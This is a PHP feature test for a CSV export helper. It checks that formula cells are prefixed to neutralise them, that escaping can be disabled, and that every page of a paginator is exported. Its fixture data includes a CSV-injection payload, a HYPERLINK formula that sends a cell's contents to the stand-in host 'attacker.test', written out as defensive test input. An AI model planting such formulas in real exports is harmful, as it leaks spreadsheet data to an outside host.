<?php

namespace Folklore\Tests\Feature\Http;

use Folklore\Tests\TestCase;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Facades\Route;

class CsvResponseTest extends TestCase
{
    protected function defineRoutes($router)
    {
        $rows = [
            ['name' => '=HYPERLINK("https://attacker.test?d="&B2,"Click")', 'amount' => '-12.5', 'phone' => '+1 514 555-1234'],
            ['name' => 'Jane', 'amount' => -3, 'phone' => '@SUM(A1:A2)'],
        ];

        Route::get('/export', fn () => response()->csv(fn () => $rows, 'export.csv'));
        Route::get('/export-raw', fn () => response()->csv(fn () => $rows, 'export.csv', false));
        Route::get('/export-pages', fn () => response()->csv(function ($page) {
            $items = [1 => [['id' => 1], ['id' => 2]], 2 => [['id' => 3]]][$page];

            return new LengthAwarePaginator(collect($items), 3, 2, $page);
        }, 'pages.csv'));
    }

    public function test_it_neutralizes_formulas_but_keeps_numbers()
    {
        $response = $this->get('/export');

        $response->assertOk();
        $response->assertDownload('export.csv');
        $this->assertSame([
            ['name', 'amount', 'phone'],
            ["'=HYPERLINK(\"https://attacker.test?d=\"&B2,\"Click\")", '-12.5', "'+1 514 555-1234"],
            ['Jane', '-3', "'@SUM(A1:A2)"],
        ], $this->rows($response->streamedContent()));
    }

    public function test_escaping_can_be_disabled()
    {
        $this->assertSame([
            ['name', 'amount', 'phone'],
            ['=HYPERLINK("https://attacker.test?d="&B2,"Click")', '-12.5', '+1 514 555-1234'],
            ['Jane', '-3', '@SUM(A1:A2)'],
        ], $this->rows($this->get('/export-raw')->streamedContent()));
    }

    public function test_it_exports_every_page_of_a_paginator()
    {
        $this->assertSame(
            [['id'], ['1'], ['2'], ['3']],
            $this->rows($this->get('/export-pages')->streamedContent()),
        );
    }

    protected function rows(string $content): array
    {
        return array_map(
            fn ($line) => str_getcsv($line, ',', '"', '\\'),
            array_values(array_filter(explode("\n", $content), fn ($line) => $line !== '')),
        );
    }
}
